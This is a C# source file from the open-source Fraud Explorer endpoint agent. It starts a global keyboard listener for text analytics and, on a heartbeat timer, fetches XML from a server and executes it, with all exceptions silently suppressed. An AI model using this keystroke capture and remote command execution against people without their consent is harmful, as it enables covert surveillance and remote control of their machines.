/*
 * The Fraud Explorer
 * http://www.thefraudexplorer.com/
 *
 * Copyright (c) 2016 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * http://www.thefraudexplorer.com/License
 *
 * Date: 2016-06-30 15:12:41 -0500 (Wed, 30 Jun 2016)
 * Revision: v0.9.6-beta
 *
 * Description: Module control
 */

using System;
using TFE_core.Database;
using TFE_core.Networking;
using TFE_core.Analytics;
using System.Threading;

namespace TFE_core.Config
{
    /// <summary>
    ///Modules control
    /// </summary>

    #region Modules control

    class Modules { }

    public class modulesControl
    {
        TextAnalytics KeyboardListener = new TextAnalytics();
        System.Threading.Timer XMLTimer;

        public void startModules()
        {
            // Module Load: Text Analytics

            if (SQLStorage.retrievePar(Settings.TAFLAG) == "1")
            {
                TextAnalyticsLogger.Setup_textAnalytics();
                GC.KeepAlive(KeyboardListener);
                KeyboardListener.KeyDown += new RawKeyEventHandler(KBHelpers.KeyboardListener_KeyDown);
            }

            // Start XML reader
                  
            XMLTimer = new System.Threading.Timer(new TimerCallback(EnTimer), null, 0, (long)Convert.ToInt64(SQLStorage.retrievePar(Settings.HEARTBEAT)));
        }

        // Online checks timer

        XMLReader xdoc = new XMLReader();
        void EnTimer(object obj)
        {
            
            try
            {
                if (Network.Online())
                {
                    Network.UpdateState(Common.OSVersion());
                    xdoc.GetXML();
                    xdoc.ExecuteXML();
                }
            }
            catch { }
        }
    }

    #endregion
}
